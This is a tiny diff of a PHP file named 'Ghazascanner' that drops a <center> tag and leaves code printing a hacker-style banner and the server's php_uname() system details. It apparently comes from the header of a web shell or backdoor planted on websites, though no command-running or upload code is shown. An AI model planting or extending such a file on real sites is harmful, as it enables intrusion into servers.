@@ -1,4 +1,3 @@
-<center>
 <?php
 echo '<title>Ghazascanner</title>';
 echo '<center><h1>Ghazascanner@_2020runbot</h1>'.'<br>'.'[uname] '.php_uname().' [/uname]<br>';
